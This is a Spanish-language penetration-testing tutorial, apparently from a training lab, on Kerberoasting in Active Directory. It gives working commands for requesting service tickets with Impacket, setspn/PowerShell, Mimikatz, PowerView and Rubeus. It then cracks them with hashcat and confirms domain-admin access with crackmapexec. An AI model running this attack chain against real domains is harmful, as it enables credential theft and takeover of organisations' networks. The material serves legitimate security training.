> Nuestra enumeración hasta este punto nos ha proporcionado una visión general del dominio y de posibles problemas. Hemos listado las cuentas de usuario y podemos ver que algunas están configuradas con Service Principal Names. Veamos cómo podemos aprovechar esto para movernos lateralmente y escalar privilegios en el dominio objetivo.

Kerberoasting es una técnica de movimiento lateral y escalada de privilegios en AD que aprovecha cuentas de servicio con SPN. Cualquier usuario de dominio puede solicitar un ticket Kerberos para esas cuentas; ese ticket (TGS-REP) va cifrado con el hash NTLM de la cuenta de servicio, de modo que, tras capturarlo, se puede atacar offline (p. ej. con Hashcat) para recuperar la contraseña en claro. Como las cuentas de servicio suelen tener contraseñas débiles o reutilizadas y, a menudo, privilegios elevados (local admins o miembros de Domain Admins), descifrar una sola puede dar acceso de administrador en múltiples servidores o al propio dominio. Incluso si el usuario no es privilegiado, el ticket descifrado permite emitir nuevos tickets de servicio (p. ej. para MSSQL/SRV01) y ejecutar código en ese contexto.

### Realizando el ataque

Dependiendo de nuestra posición en la red, este ataque puede llevarse a cabo de varias formas:

- Desde un host Linux no unido al dominio usando credenciales válidas de usuario de dominio.    
- Desde un host Linux unido al dominio como root, tras obtener el archivo keytab.    
- Desde un host Windows unido al dominio, autenticados como usuario de dominio.    
- Desde un host Windows unido al dominio con una shell en el contexto de una cuenta de dominio.    
- Como SYSTEM en un host Windows unido al dominio.    
- Desde un host Windows no unido al dominio usando `runas /netonly`.    

Se pueden emplear diversas herramientas para realizar el ataque:
- `GetUserSPNs.py` de Impacket, desde un host Linux no unido al dominio.    
- Una combinación de la utilidad integrada `setspn.exe`, PowerShell y Mimikatz en Windows.    
- En Windows, usando herramientas como PowerView, Rubeus y otros scripts de PowerShell.    

Obtener un ticket TGS mediante Kerberoasting no garantiza credenciales válidas: el ticket debe romperse offline (por ejemplo, con Hashcat) para recuperar la contraseña en claro. Los tickets TGS tardan más en crackearse que otros formatos como hashes NTLM, por lo que, salvo que la contraseña sea débil, puede ser difícil o imposible obtenerla en claro con un rig de cracking estándar. Kerberoasting puede dar acceso inmediato a cuentas privilegiadas si rompemos un ticket TGS débil, pero no siempre funciona: a veces solo obtenemos tickets que no llevan a usuarios con privilegios y no ganamos nada. En esos casos, el hallazgo se reporta como riesgo medio (para advertir del peligro de SPN débiles), mientras que si conseguimos acceso de administrador de dominio se reportaría como riesgo alto. Es clave matizar en el informe cómo influyen factores como la fortaleza de las contraseñas al evaluar el nivel de riesgo.
## Desde Linux

Para acontecer kerberoasting desde Linux usaremos herramientas del módulo de `impacket`. Empezamos listando todos los SPN del dominio usando credenciales válidas (contraseña, hash o ticket) y la IP de un DC. El comando mostrará un listado ordenado de cuentas con SPN, de las cuales varias pueden pertenecer a **Domain Admins**. Romper el ticket de cualquiera de ellas podría comprometer el dominio, por lo que conviene revisar siempre la membresía de grupo en busca de tickets fáciles de crackear que faciliten el movimiento lateral o escalada de privilegios.

##### Listando cuentas SPN con `GetUserSPNs.py`

```shell
$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend

Impacket v0.9.25.dev1+20220208.122405.769c3196 - Copyright 2021 SecureAuth Corporation
...SNIP...
```

Podemos ahora traernos todos los tickets TGS para procesamiento offline usando el flag `-request`. Los tickets TGS serán puestos en un formato que pueden estar listos para adivinarlos con John o Hashcat

```shell
$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request 

...SNIP...

$krb5tgs$23$*BACKUPAGENT$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/BACKUPAGENT*$790...
$krb5tgs$23$*SOLARWINDSMONITOR$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/SOLARWINDSMONITOR*$993d...
```

Podemos incluso ser más específicos y solicitar solo el ticket TGS para una cuenta específica. Por ejemplo, para la cuenta `sqldev`:

```shell
$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev
```

Con este ticket en mano, podríamos intentar adivinar la contraseña usando hashcat. Si tenemos éxito, puede que obtengamos permisos de administrador de dominio. Para facilitar el cracking offline, se recomienda utilizar el flag `-outputfile` para escribir los tickets TGS en un archivo que podamos usar directamente con Hashcat.

```shell
$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs
```

##### Crackeando el ticket offline con Hashcat

Una vez tengamos el ticket obtenido, intentamos adivinarlo con hashcar usando el módulo `13100`

```shell-session
hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt 
```

Tras esperar un poco, obtenemos la contraseña en claro. Como último paso, podemos confirmar nuestro acceso y comprobar que, de hecho, tenemos privilegios de Administrador de Dominio al poder autenticarnos al DC en el dominio. Desde aquí podríamos realizar post-explotación y continuar enumerando el dominio para otras rutas a comprometer, así como fallos en configuración u otros problemas.

```bash
$ sudo crackmapexec smb 172.16.5.5 -u sqldev -p database!

SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\sqldev:database! (Pwn3d!
```

## Desde Windows

Antes de que existieran herramientas como Rubeus, robar o forjar tickets Kerberos era un proceso manual y complejo. A medida que las tácticas y las defensas han evolucionado, ahora podemos realizar Kerberoasting desde Windows de varias formas. Para iniciar este proceso, exploraremos primero la vía manual y luego pasaremos a herramientas más automatizadas. Comencemos con el binario integrado **setspn** para enumerar los SPN en el dominio.

##### Enumerando SPNs con setspn.exe

> ***SPN** significa Service Principal Name o Nombre de Entidad de Servicio*

```cmd-session
C:\htb> setspn.exe -Q */*

Checking domain DC=INLANEFREIGHT,DC=LOCAL
CN=ACADEMY-EA-DC01,OU=Domain Controllers,DC=INLANEFREIGHT,DC=LOCAL
        exchangeAB/ACADEMY-EA-DC01
        exchangeAB/ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
        TERMSRV/ACADEMY-EA-DC01
        TERMSRV/ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
        Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
        ldap/ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/ForestDnsZones.INLANEFREIGHT.LOCAL
        ldap/ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DomainDnsZones.INLANEFREIGHT.LOCAL

<SNIP>

CN=BACKUPAGENT,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
        backupjob/veam001.inlanefreight.local
CN=SOLARWINDSMONITOR,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
        sts/inlanefreight.local

<SNIP>

CN=sqlprod,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
        MSSQLSvc/SPSJDB.inlanefreight.local:1433
CN=sqlqa,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
        MSSQLSvc/SQL-CL01-01inlanefreight.local:49351
CN=sqldev,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
        MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433
CN=adfs,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
        adfsconnect/azure01.inlanefreight.local

Existing SPN found!
```

Observaremos que la herramienta devuelve numerosos SPN distintos para los distintos hosts del dominio. Nos centraremos en las cuentas de usuario e ignoraremos las cuentas de equipo que aparezcan. A continuación, desde PowerShell podemos solicitar tickets TGS para una cuenta en la consola anterior y cargarlos en memoria. Una vez allí, los extraeremos con Mimikatz.

##### Apuntando a un usuario

```powershell
PS C:\htb> Add-Type -AssemblyName System.IdentityModel
PS C:\htb> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"

Id                   : uuid-67a2100c-150f-477c-a28a-19f6cfed4e90-2
SecurityKeys         : {System.IdentityModel.Tokens.InMemorySymmetricSecurityKey}
ValidFrom            : 2/24/2022 11:36:22 PM
ValidTo              : 2/25/2022 8:55:25 AM
ServicePrincipalName : MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433
SecurityKey          : System.IdentityModel.Tokens.InMemorySymmetricSecurityKey
```

Antes de continuar, analicemos los comandos anteriores para entender qué hacen (que es básicamente lo que emplea Rubeus en su método Kerberoasting por defecto):

1. **Add-Type**  
    Agrega una clase del .NET Framework a nuestra sesión de PowerShell, de modo que luego podamos instanciarla como cualquier otro objeto de .NET.    
2. **-AssemblyName**  
    Con este parámetro le indicamos a `Add-Type` el ensamblado (.dll) que contiene los tipos (clases) que queremos usar.    
3. **System.IdentityModel**  
    Es un namespace que incluye varias clases para construir servicios de tokens de seguridad.    
4. **New-Object**  
    Crea una instancia de un objeto del .NET Framework. En este caso, usaremos la clase `KerberosRequestorSecurityToken` del namespace `System.IdentityModel.Tokens`.    
5. **KerberosRequestorSecurityToken**  
    Al instanciar esta clase con el nombre del SPN, solicitamos un ticket Kerberos TGS para la cuenta objetivo en nuestra sesión de inicio de sesión actual

> **Nota:**  
> Podríamos recuperar todos los tickets con el mismo método, pero eso también incluiría los tickets de las cuentas de equipo, por lo que no es óptimo si solo nos interesan los de cuentas de usuario.

##### Obteniendo todos los tickets usando setspn.exe

```powershell
PS C:\htb> setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
```

El comando anterior combina el método explicado previamente con `setspn.exe` para solicitar tickets de todas las cuentas que tengan SPN configurados.

Ahora que los tickets están cargados en memoria, podemos usar Mimikatz para extraerlos.

##### Extrayendo los tickets en memoria con Mimikatz

Lanzamos `mimikatz.exe` y obtenemos una terminal. A partir de aquí:

```cmd-session
Using 'mimikatz.log' for logfile : OK

mimikatz # base64 /out:true
isBase64InterceptInput  is false
isBase64InterceptOutput is true

mimikatz # kerberos::list /export  

<SNIP>

[00000002] - 0x00000017 - rc4_hmac_nt      
   Start/End/MaxRenew: 2/24/2022 3:36:22 PM ; 2/25/2022 12:55:25 AM ; 3/3/2022 2:55:25 PM
   Server Name       : MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433 @ INLANEFREIGHT.LOCAL
   Client Name       : htb-student @ INLANEFREIGHT.LOCAL
   Flags 40a10000    : name_canonicalize ; pre_authent ; renewable ; forwardable ; 
====================
Base64 of file : 2-40a10000-htb-student@MSSQLSvc~DEV-PRE-SQL.inlanefreight.local~1433-INLANEFREIGHT.LOCAL.kirbi
====================
<base64_code>
====================
	* Saved to file       : ...
```

Si no especificamos `base64 /out:true`, Mimikatz extraerá los tickets y los guardará directamente en archivos `.kirbi`. Dependiendo de nuestra ubicación en la red y de lo fácil que nos resulte mover esos ficheros a nuestro host de ataque, esto puede ser más cómodo a la hora de crakear los tickets.

A continuación, tomaremos el blob en Base64 obtenido anteriormente y eliminaremos saltos de línea y espacios en blanco, ya que la salida trae los datos divididos en columnas; necesitamos que todo quede en una sola línea para el siguiente paso.

##### Preparando el Blob en Base64 para el cracking

```shell-session
$ echo "<base64 blob>" |  tr -d \\n 

doIGPzCCBjugAwIBBaEDAgEWooIFKDCCBSRhggUgMIIFHKADA...
```

Podemos colocar la línea única anterior en un archivo y convertirla de nuevo en un fichero `.kirbi` usando la utilidad `base64`.

```shell-session
$ cat encoded_file | base64 -d > sqldev.kirbi
```

Después, podemos usar esta [versión](https://raw.githubusercontent.com/nidem/kerberoast/907bf234745fe907cf85f3fd916d1c14ab9d65c0/kirbi2john.py) de `kirbi2john.py` para extraer el ticket Kerberos del archivo TGS. 

```shell-session
$ python2.7 kirbi2john.py sqldev.kirbi
```

Esto creará un archivo llamado `crack_file`. Debemos modificar el archivo un poco  para poder usar Hashcat

```shell-session
$ sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
```

Lo crackeamos con Hashcat, con el módulo `13100` y obtenemos la contraseña `database!`. Si decidimos omitir la salida en Base64 con Mimikatz y ejecutar

```
mimikatz # kerberos::list /export
```

los archivos `.kirbi` se escribirán directamente en disco. En ese caso, podemos descargar los ficheros y ejecutar `kirbi2john.py` sobre ellos sin necesidad de decodificar Base64.

Ahora que hemos visto el método más manual y anticuado para realizar Kerberoasting desde Windows y procesar offline, veamos formas más rápidas. La mayoría de las auditorías tienen tiempo limitado y necesitamos trabajar con la máxima eficiencia, por lo que el método anterior no será siempre nuestra primera opción. Sin embargo, es útil contar con estos trucos y metodologías como alternativa en caso de que nuestras herramientas automatizadas fallen o estén bloqueadas.

### Ruta automatizada / basada en herramientas

A continuación cubriremos dos formas mucho más rápidas de realizar Kerberoasting desde un host Windows. Primero, utilicemos PowerView para extraer los tickets TGS y convertirlos al formato de Hashcat. Podemos comenzar enumerando las cuentas SPN.

##### Usando PowerView para enumerar cuentas SPN

```powershell-session
PS C:\htb> Import-Module .\PowerView.ps1
PS C:\htb> Get-DomainUser * -spn | select samaccountname

samaccountname
--------------
adfs
backupagent
krbtgt
sqldev
sqlprod
sqlqa
solarwindsmonitor
```

Desde aquí, podríamos apuntar a un usuario específico y obtener el ticket TGS en formato Hashcat

```powershell
PS C:\htb> Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat

SamAccountName       : sqldev
DistinguishedName    : CN=sqldev,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
ServicePrincipalName : MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433
TicketByteHexStream  :
Hash                 : $krb5tgs$23$*...
```

Finalmente, podemos exportar todos los tickets a un fichero CSV para procesarlos offline. 

```powershell-session
PS C:\htb> Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
```

También podemos usar Rubeus para acontecer Kerberoasting incluso más fácilmente y rápido. Rubeus nos proporciona una variedad de opciones para Kerberoasting. Como podemos ver al recorrer el menú de ayuda de Rubeus, la herramienta ofrece multitud de opciones para interactuar con Kerberos, la mayoría fuera del alcance de este módulo y que se tratarán en profundidad en futuros módulos sobre ataques avanzados a Kerberos. Vale la pena revisar el menú, familiarizarse con las opciones y documentarse sobre las diversas tareas posibles. Algunas opciones incluyen:

- Realizar Kerberoasting y volcar hashes a un archivo.    
- Usar credenciales alternativas.    
- Combinar Kerberoasting con un ataque Pass-the-Ticket.    
- Hacer un Kerberoasting “opsec” para filtrar cuentas habilitadas con AES.    
- Solicitar tickets de cuentas cuyas contraseñas se establecieron en un rango de fechas específico.    
- Limitar el número de tickets solicitados.    
- Realizar Kerberoasting con cifrado AES.

Podemos empezar usando Rubeus para recopilar algunas estadísticas. En la salida siguiente vemos que hay nueve usuarios atacables mediante Kerberoasting: siete de ellos soportan cifrado RC4 para las solicitudes de ticket y dos soportan AES 128/256. Más adelante hablaremos de los tipos de cifrado. También observamos que las contraseñas de las nueve cuentas se establecieron este año (2022 en el momento de redactar esto). Si viésemos cuentas SPN con contraseñas fijadas hace cinco años o más, podrían ser objetivos interesantes, ya que podrían tener una contraseña débil que se configuró en sus inicios y nunca se cambió al madurar la organización.

```powershell-session
PS C:\htb> .\Rubeus.exe kerberoast /stats

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.2


[*] Action: Kerberoasting

[*] Listing statistics about target users, no ticket requests being performed.
[*] Target Domain          : INLANEFREIGHT.LOCAL
[*] Searching path 'LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL' for '(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'

[*] Total kerberoastable users : 9


 ------------------------------------------------------------
 | Supported Encryption Type                        | Count |
 ------------------------------------------------------------
 | RC4_HMAC_DEFAULT                                 | 7     |
 | AES128_CTS_HMAC_SHA1_96, AES256_CTS_HMAC_SHA1_96 | 2     |
 ------------------------------------------------------------

 ----------------------------------
 | Password Last Set Year | Count |
 ----------------------------------
 | 2022                   | 9     |
 ----------------------------------
```

Vamos a usar Rubeus para solicitar tickets de las cuentas cuyo atributo **adminCount** esté establecido en 1. Estas serán probablemente objetivos de alto valor y merecerán nuestro enfoque inicial en el cracking offline con Hashcat. Asegúrate de incluir la opción `/nowrap`, de modo que los hashes no se dividan en columnas y puedan copiarse directamente para el cracking; según la documentación, `/nowrap` impide que cualquier blob de ticket en Base64 se ajuste en columnas, por lo que no tendremos que preocuparnos de eliminar espacios o saltos de línea antes de usar Hashcat.

```powershell-session
PS C:\htb> .\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap

...SNIP...

[*] Hash                   : $krb5tgs$23$*backupagent$INLANEFREIGHT.LOCAL$backupjob/ve...
```

### Tipos de encriptado

Las herramientas de Kerberoasting suelen solicitar cifrado RC4 (tipo 23) porque es más débil y rápido de crackear con Hashcat que AES (tipos 17 y 18). Por eso la mayoría de hashes comienzan con `$krb5tgs$23$*`. Aunque AES-128 y AES-256 también pueden romperse offline, requieren mucho más tiempo salvo contraseñas muy débiles.



